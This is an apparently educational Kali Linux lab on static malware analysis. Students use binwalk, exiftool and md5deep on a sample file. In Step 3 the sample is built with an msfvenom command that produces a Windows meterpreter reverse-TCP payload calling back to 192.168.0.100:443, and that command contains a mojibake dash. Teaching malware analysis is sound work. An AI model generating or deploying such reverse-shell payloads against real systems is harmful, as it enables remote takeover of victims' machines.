Analyze and Classify Malware Lab

Description: In this lab, users will perform static analysis on a malicious executable file and perform a hash
of the file.

Requirement: Users will need access to their own Kali Linux machine. All commands below are native to Kali Linux.

Step 1: Log into the Kali Linux machine by entering your username and password. Default username and password is kali.

Step 2: Click the Terminal icon at the top of the Kali desktop.

Step 3: At the Terminal prompt, type the following command and hit Enter to create the
malicious executable file.

    - msfvenom -a x86 â€“platform windows -p windows/meterpreter/reverse_tcp
    LHOST=192.168.0.100 LPORT=443 -f exe -o maliciousfile.exe
Note: It might take a few minutes to create the file.

Step 4: Type ls at the prompt and hit the Enter key to verify the file has been created.

Step 5: Type clear at the Terminal prompt and press Enter.

Step 6: Next, type the following at the Terminal prompt
    - binwalk -B maliciousfile.exe
Note: This scans the file for common malicious signatures.

Step 7 (Optional): Next, enter the following command at the prompt and press Enter.
    - binwalk -3 maliciousfile.exe
Note: Creates 3D signature of the malicious file

Step 8: Enter the following command and press Enter to see if there are any opcodes.
    - binwalk -A maliciousfile.exe
Note: Output shows an opcode, which is the portion of a machine language instruction that specifies the operation to be performed.

There should only be Nopcodes.

Step 9: Next, type the following command at the prompt and press Enter.
    - exiftool maliciousfile.exe
Note: Will provide read, write and edit meta information.

Step 10: You will next perform a MD5 hash on the malicious file.
    - md5deep maliciousfile.exe
